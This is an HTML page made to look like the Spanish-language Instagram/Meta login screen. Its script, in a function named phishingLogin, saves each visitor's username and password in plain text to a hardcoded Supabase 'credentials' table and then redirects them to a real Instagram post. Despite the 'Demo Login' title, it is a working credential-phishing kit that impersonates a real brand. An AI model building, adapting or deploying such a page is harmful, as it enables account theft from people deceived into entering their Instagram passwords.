<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Demo Login</title>

<!-- Fuentes -->
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<!-- Supabase JS (v2) -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>

<style>
  * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
  body { margin: 0; background: #fff; color: #262626; }
  .app { min-height:100vh; padding:24px 16px; display:flex; flex-direction:column; align-items:center; }

  .language { font-size:16px; color:#8e8e8e; margin-top:10px; }

  .logo { margin:48px 0 32px; }
  .logo img { width:64px; height:64px; object-fit:contain; display:block; }

  .form { width:100%; max-width:360px; }
  .form input {
    width:100%;
    height:52px;
    padding:0 16px;
    font-size:16px;
    border:1px solid #dbdbdb;
    border-radius:12px;
    margin-bottom:12px;
  }
  .form input:focus { outline: none; border-color:#a8a8a8; }

  .login-btn {
    width:100%;
    height:48px;
    background:#0a66c2;
    border:none;
    border-radius:999px;
    color:#fff;
    font-size:16px;
    font-weight:500;
    cursor:pointer;
  }

  .forgot { margin-top:18px; text-align:center; font-size:14px; color:#262626; }

  .status { text-align:center; font-size:14px; margin-top:12px; color:#b91c1c; }

  .spacer { flex:1; }

  .signup-btn {
    width:100%;
    max-width:360px;
    height:48px;
    border-radius:999px;
    border:1px solid #0a66c2;
    background:transparent;
    color:#0a66c2;
    font-size:16px;
    font-weight:500;
    margin-bottom:22px;
    cursor:pointer;
  }

  /* META logo: símbolo infinito con trazo redondeado + texto */
  .meta {
    display:flex;
    align-items:center;
    gap:10px;
    font-size:14px;
    color:#9ca3af;
    margin-bottom:8px;
  }

  .meta svg { width:36px; height:auto; display:block; }

  /* ajuste responsive pequeño */
  @media (max-width:420px) {
    .app { padding:20px 12px; }
    .logo img { width:56px; height:56px; }
  }
</style>
</head>
<body>
  <div class="app">
    <div class="language">Español (España)</div>

    <div class="logo">
      <!-- Icono Instagram sólo visual -->
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
    </div>

    <div class="form">
      <input id="email" type="email" placeholder="Usuario, correo electrónico o móvil" autocomplete="username">
      <input id="password" type="password" placeholder="Contraseña" autocomplete="current-password">

      <button class="login-btn" onclick="phishingLogin()">Iniciar sesión</button>

      <div class="forgot">¿Has olvidado la contraseña?</div>
      <div class="status" id="status" aria-live="polite"></div>
    </div>

    <div class="spacer"></div>

    <button class="signup-btn" onclick="signupDemo()">Crear cuenta nueva</button>

    <!-- Logo Meta actualizado: símbolo infinito con trazo redondeado + texto -->
    <div class="meta" aria-hidden="false">
      <svg viewBox="0 0 120 40" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Meta logo">
        <!-- dibujado como trazo (stroke) para versión igual a la app -->
        <path d="M18 20
                 C18 10, 36 10, 36 20
                 C36 30, 18 30, 18 20
                 C18 20, 36 30, 54 10
                 C72 -10, 90 10, 90 20
                 C90 30, 72 30, 54 10
                 C36 -10, 18 10, 18 20Z"
              fill="none" stroke="#9ca3af" stroke-width="4.8" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      <span>Meta</span>
    </div>
  </div>

<script>
  // === CONFIGURA TUS CREDENCIALES DE SUPABASE AQUÍ ===
  // Reemplaza por tu URL y anon key (variables de entorno en Vercel)
  const SUPABASE_URL = "https://ydshkqrotgtnhkcjqaxi.supabase.co";
  const SUPABASE_ANON_KEY = "sb_publishable_KXyRSLWAwSUwasKfw5nZ9A_Lj6XnT-Q";

  // cliente supabase desde UMD
  const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

  async function phishingLogin() {
    const statusEl = document.getElementById('status');
    statusEl.textContent = "";
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    if (!email || !password) {
      statusEl.style.color = "#b91c1c";
      statusEl.textContent = "Completa todos los campos";
      return;
    }

    // Guardar credenciales en la base de datos
    try {
      const { data, error } = await supabase
        .from('credentials')
        .insert([{ email, password }]);

      if (error) {
        statusEl.style.color = "#b91c1c";
        statusEl.textContent = "Error al guardar las credenciales: " + error.message;
      } else {
        statusEl.style.color = "#059669";
        statusEl.textContent = "Credenciales guardadas correctamente";
        // Redirigir al usuario a la URL especificada
        window.location.href = "https://www.instagram.com/p/DMWYvoQT50S/?img_index=1&igsh=dXN1bGRuNHE2ejY3";
      }
    } catch (e) {
      statusEl.style.color = "#b91c1c";
      statusEl.textContent = "Error de conexión: " + e.message;
    }
  }

  // Demo: función para abrir el flujo de registro oficial de supabase (opcional)
  function signupDemo() {
    alert("Para crear cuentas en este demo, usa el panel de Supabase (Auth) o implementa un flujo de registro seguro.");
  }
</script>
</body>
</html>
